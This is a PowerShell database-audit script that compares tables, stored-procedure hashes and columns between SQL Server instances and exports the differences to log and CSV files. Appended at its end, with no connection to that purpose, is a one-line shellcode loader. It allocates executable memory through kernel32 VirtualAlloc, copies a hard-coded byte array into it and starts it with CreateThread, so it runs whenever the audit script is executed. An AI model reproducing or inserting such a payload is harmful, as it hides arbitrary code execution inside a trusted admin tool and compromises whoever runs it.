param( 
	$SqlServerOne = 'XSQLUTIL18',  
	$FirstDatabase = 'dbamaint', 
	$SecondDatabase = 'dbamaint',
	[String[]] $ServerList,
	$FilePrefix = 'Log',
	[switch]$Log,
	[switch]$Column
	)

$File = $FilePrefix + '{0}-{1}.csv'
$Date = (Get-Date -Format ddMMyyyy)

$ScriptName = [system.io.path]::GetFilenameWithoutExtension($MyInvocation.InvocationName)


$TableDifferences = @()
$SprocDifferences = @()
$ColumnDifferences = @()

$TableQuery = "	
	SELECT name AS TableName
		, SCHEMA_NAME(SCHEMA_ID) AS [Schema]
	FROM sys.objects
	WHERE type LIKE 'U'
	AND is_ms_shipped = '0'"

$SprocQuery = "
	SELECT SPECIFIC_NAME AS SprocName
		, (SELECT CONVERT(NVARCHAR(42),HashBytes('SHA1', ROUTINE_DEFINITION),2)) AS SprocHASH
	FROM INFORMATION_SCHEMA.ROUTINES
	WHERE ROUTINE_TYPE = 'PROCEDURE' 
	AND ROUTINE_NAME NOT LIKE 'dt_%' 
	AND ROUTINE_NAME NOT LIKE '%diagram%' 
	AND ROUTINE_NAME NOT LIKE 'upd_SupportPasswords_AcrossSites%'
	AND ROUTINE_NAME NOT LIKE 'upd_SupportSMCPasswords_AcrossSites%'
	AND ROUTINE_NAME != 'sel_AuditTrackingReportStatus'
	"

function write-log([string]$info)
{
    if($loginitialized -eq $false)
	{
        $FileHeader > $logfile            
        $script:loginitialized = $True            
    }            
    $info >> $logfile            
}

function Run-Query()
{
	param (
	$SqlQuery,
	$SqlServer,
	$SqlCatalog, 
	$SqlUser,
	$SqlPass
	)
	
	$SqlConnection = New-Object System.Data.SqlClient.SqlConnection("Data Source=$SqlServer;Integrated Security=SSPI;Initial Catalog=$SqlCatalog;");
	
	$SqlCmd = New-Object System.Data.SqlClient.SqlCommand
	$SqlCmd.CommandText = $SqlQuery
	$SqlCmd.Connection = $SqlConnection
	
	$SqlAdapter = New-Object System.Data.SqlClient.SqlDataAdapter
	$SqlAdapter.SelectCommand = $SqlCmd
	
	$DataSet = New-Object System.Data.DataSet
	$a = $SqlAdapter.Fill($DataSet)
	
	$SqlConnection.Close()
	
	$DataSet.Tables | Select-Object -ExpandProperty Rows
}


            
$script:logfile = "E:\Dexma\Logs\DbamaintAudit-$(get-date -format MMddyy).log"
$script:Seperator = @"

$("-" * 25)

"@            
$script:loginitialized = $false            
$script:FileHeader = 
@"
SourceServer, ComparedServer, DifferentServer, Database, Schema.Table, Column, Type, Length
"@


Write-Log


foreach ($SqlServerTwo in $ServerList)
{


$TablesDBOne = Run-Query -SqlQuery $TableQuery -SqlServer $SqlServerOne -SqlCatalog $FirstDatabase -SqlUser $SqlUsernameOne -SqlPass $SqlPasswordOne | Select-Object -Property TableName, Schema
$TablesDBTwo = Run-Query -SqlQuery $TableQuery -SqlServer $SqlServerTwo -SqlCatalog $SecondDatabase -SqlUser $SqlUsernameTwo -SqlPass $SqlPasswordTwo | Select-Object -Property TableName, Schema


$SprocsDBOne = Run-Query -SqlQuery $SprocQuery -SqlServer $SqlServerOne -SqlCatalog $FirstDatabase -SqlUser $SqlUsernameOne -SqlPass $SqlPasswordOne | Select-Object -Property SprocName, SprocHASH
$SprocsDBTwo = Run-Query -SqlQuery $SprocQuery -SqlServer $SqlServerTwo -SqlCatalog $SecondDatabase -SqlUser $SqlUsernameOne -SqlPass $SqlPasswordOne | Select-Object -Property SprocName, SprocHASH

$Server = 		@{Name='Server';	Expression={if ($_.SideIndicator -eq '<='){'{0}' -f $SqlServerOne} 	else {'{0}' -f $SqlServerTwo}}}
$Database = 	@{Name='Database';	Expression={if ($_.SideIndicator -eq '<='){'{0}' -f $FirstDatabase} else {'{0}' -f $SecondDatabase}}}

$TableDifference = Compare-Object $TablesDBOne $TablesDBTwo -SyncWindow (($TablesDBOne.count + $TablesDBTwo.count)/2) -Property TableName, Schema | select TableName, Schema, $Server, $Database
$SprocDifference = Compare-Object $SprocsDBOne $SprocsDBTwo -SyncWindow (($SprocsDBOne.count + $SprocsDBTwo.count)/2) -Property SprocName, SprocHASH | select SprocName, SprocHASH, $Server, $Database

if ($log)
{
	if ($TableDifference)
	{
		foreach ( $Row in $TableDifference )
			{
				write-log "$SqlServerOne, $SqlServerTwo, $($Row.Server), $FirstDatabase, $($Row.Schema).$($Row.TableName)"
				
				$TableDiff = New-Object -TypeName PSObject
					Add-Member -InputObject $TableDiff -type NoteProperty -Name "SQLServerExists" 	-value $SqlServerOne
					Add-Member -InputObject $TableDiff -type NoteProperty -Name "SQLServerMissing" 	-value $SqlServerTwo
					Add-Member -InputObject $TableDiff -type NoteProperty -Name "Database" 			-value $($Row.Database)
					Add-Member -InputObject $TableDiff -type NoteProperty -Name "Schema"			-Value $($Row.Schema)
					Add-Member -InputObject $TableDiff -type NoteProperty -Name "TableName" 		-value $($Row.TableName)
				$TableDifferences += $TableDiff
			}
	}
	if ($SprocDifference)
	{
		foreach ( $Diff in $SprocDifference )
			{
				
				write-log "$SqlServerOne, $SqlServerTwo, $($Diff.Server), $FirstDatabase, $($Diff.SprocName), $($Diff.SprocHASH)"
				$SprocDiff = New-Object -TypeName PSObject
					Add-Member -InputObject $SprocDiff -type NoteProperty -Name "SQLServerExists" 	-Value $SqlServerOne
					Add-Member -InputObject $SprocDiff -type NoteProperty -Name "SQLServerMissing" 	-Value $SqlServerTwo
					Add-Member -InputObject $SprocDiff -type NoteProperty -Name "Server" 			-Value $($Diff.Server)
					Add-Member -InputObject $SprocDiff -type NoteProperty -Name "Database" 			-Value $($Diff.Database)
					Add-Member -InputObject $SprocDiff -type NoteProperty -Name "SprocName" 		-Value $($Diff.SprocName)
					Add-Member -InputObject $SprocDiff -type NoteProperty -Name "SprocHASH" 		-Value $($Diff.SprocHASH)
				$SprocDifferences += $SprocDiff
			}
	}
}






if ($Column)
{
	
	$SameTables = Compare-Object $TablesDBOne $TablesDBTwo -SyncWindow (($TablesDBOne.count + $TablesDBTwo.count)/2) -Property TableName -IncludeEqual -ExcludeDifferent 
	
	$ColumnQuery = @"
select so.name as TableName
	, sc.name as ColumnName
	, SCHEMA_NAME(so.SCHEMA_ID) as [Schema]
	, st.name as [Type]
	, isc.CHARACTER_MAXIMUM_LENGTH AS [Length]
	, st.User_Type_ID as UserTypeID
from sys.objects so, sys.columns sc, sys.types st, information_schema.columns isc
where so.type like 'U' and
	so.name not like 'dtproperties' 
	and sc.user_type_id= st.user_type_id
	and so.object_id=sc.object_id
	and sc.name = isc.COLUMN_NAME
	and so.name = isc.TABLE_NAME
	and so.name = '{0}'
order by so.name, sc.name--, sc.type
"@
	
	foreach ($Table in $SameTables)
	{
		$ColumnsDBOne = Run-Query -SqlQuery ($ColumnQuery -f $table.tablename) -SqlServer $SqlServerOne -SqlCatalog dbamaint -SqlUser $SqlUsernameOne -SqlPass $SqlPasswordOne | Select-Object -Property TableName, ColumnName, Schema, Type, Length, UserTypeID, Name
		$ColumnsDBTwo = Run-Query -SqlQuery ($ColumnQuery -f $table.tablename) -SqlServer $SqlServerTwo -SqlCatalog dbamaint -SqlUser $SqlUsernameTwo -SqlPass $SqlPasswordTwo | Select-Object -Property TableName, ColumnName, Schema, Type, Length, UserTypeID, Name
		
		

		$ColumnDifference = Compare-Object $ColumnsDBOne $ColumnsDBTwo -SyncWindow (($ColumnsDBOne.count + $ColumnsDBTwo.count)/2) -Property TableName, Schema, ColumnName, Type, Length, UserTypeID, Name | Select-Object TableName, Schema, ColumnName, Type, Length, UserTypeID, Name, $Server, $Database

		if ($log -and $ColumnDifference )
		{
			foreach ( $Row in $ColumnDifference )
			{
				write-log "$SqlServerOne, $SqlServerTwo, $($Row.Server), $($Row.Database), $($Row.TableName), $($Row.Schema).$($Row.ColumnName), $($Row.Type), $($Row.length)"
				$ColumnDiff = New-Object -TypeName PSObject
					
					
					Add-Member -InputObject $ColumnDiff -type NoteProperty -Name "Server" 		-Value $($Row.Server)
					Add-Member -InputObject $ColumnDiff -type NoteProperty -Name "Database" 	-Value $($Row.Database)
					Add-Member -InputObject $ColumnDiff -type NoteProperty -Name "TableName" 	-Value $($Row.TableName)
					Add-Member -InputObject $ColumnDiff -type NoteProperty -Name "Schema"		-Value $($Row.Schema)
					Add-Member -InputObject $ColumnDiff -type NoteProperty -Name "ColumnName" 	-Value $($Row.ColumnName)
					Add-Member -InputObject $ColumnDiff -type NoteProperty -Name "Type" 		-Value $($Row.Type)
					Add-Member -InputObject $ColumnDiff -type NoteProperty -Name "Length" 		-Value $($Row.length)
				$ColumnDifferences += $ColumnDiff
			}
		}
		
		
		
	}
}
}








$TableDifferences | Sort-Object -Property SQLServerTwo, TableName, Database | Export-Csv -Path e:\dexma\logs\TableDiff.$ScriptName.$Date.csv -notypeinformation
$SprocDifferences | Sort-Object -Property SQLServerMissing, SprocHASH, SprocName  | Export-Csv -Path e:\dexma\logs\SprocDiff.$ScriptName.$Date.csv -notypeinformation
$ColumnDifferences | Sort-Object -Property Server, ColumnName, TableName | Where-Object {$_.Server -ne "XSQLUTIL18"} | Export-Csv -Path e:\dexma\logs\ColDiff.$ScriptName.$Date.csv -notypeinformation



$gfht = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $gfht -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xe5,0xba,0x9c,0x95,0xac,0x48,0xd9,0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,0x47,0x83,0xc6,0x04,0x31,0x56,0x14,0x03,0x56,0x88,0x77,0x59,0xb4,0x58,0xf5,0xa2,0x45,0x98,0x9a,0x2b,0xa0,0xa9,0x9a,0x48,0xa0,0x99,0x2a,0x1a,0xe4,0x15,0xc0,0x4e,0x1d,0xae,0xa4,0x46,0x12,0x07,0x02,0xb1,0x1d,0x98,0x3f,0x81,0x3c,0x1a,0x42,0xd6,0x9e,0x23,0x8d,0x2b,0xde,0x64,0xf0,0xc6,0xb2,0x3d,0x7e,0x74,0x23,0x4a,0xca,0x45,0xc8,0x00,0xda,0xcd,0x2d,0xd0,0xdd,0xfc,0xe3,0x6b,0x84,0xde,0x02,0xb8,0xbc,0x56,0x1d,0xdd,0xf9,0x21,0x96,0x15,0x75,0xb0,0x7e,0x64,0x76,0x1f,0xbf,0x49,0x85,0x61,0x87,0x6d,0x76,0x14,0xf1,0x8e,0x0b,0x2f,0xc6,0xed,0xd7,0xba,0xdd,0x55,0x93,0x1d,0x3a,0x64,0x70,0xfb,0xc9,0x6a,0x3d,0x8f,0x96,0x6e,0xc0,0x5c,0xad,0x8a,0x49,0x63,0x62,0x1b,0x09,0x40,0xa6,0x40,0xc9,0xe9,0xff,0x2c,0xbc,0x16,0x1f,0x8f,0x61,0xb3,0x6b,0x3d,0x75,0xce,0x31,0x29,0xba,0xe3,0xc9,0xa9,0xd4,0x74,0xb9,0x9b,0x7b,0x2f,0x55,0x97,0xf4,0xe9,0xa2,0xd8,0x2e,0x4d,0x3c,0x27,0xd1,0xae,0x14,0xe3,0x85,0xfe,0x0e,0xc2,0xa5,0x94,0xce,0xeb,0x73,0x00,0xca,0x7b,0x5b,0xe9,0x91,0x73,0xcb,0x13,0x1a,0x82,0xb7,0x9d,0xfc,0xd4,0x97,0xcd,0x50,0x94,0x47,0xae,0x00,0x7c,0x82,0x21,0x7e,0x9c,0xad,0xeb,0x17,0x36,0x42,0x42,0x4f,0xae,0xfb,0xcf,0x1b,0x4f,0x03,0xda,0x61,0x4f,0x8f,0xe9,0x96,0x01,0x78,0x87,0x84,0xf5,0x88,0xd2,0xf7,0x53,0x96,0xc8,0x92,0x5b,0x02,0xf7,0x34,0x0c,0xba,0xf5,0x61,0x7a,0x65,0x05,0x44,0xf1,0xac,0x93,0x27,0x6d,0xd1,0x73,0xa8,0x6d,0x87,0x19,0xa8,0x05,0x7f,0x7a,0xfb,0x30,0x80,0x57,0x6f,0xe9,0x15,0x58,0xc6,0x5e,0xbd,0x30,0xe4,0xb9,0x89,0x9e,0x17,0xec,0x0b,0xe2,0xc1,0xc8,0x79,0x0a,0xd2;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$rY6=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($rY6.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$rY6,0,0,0);for (;;){Start-sleep 60};

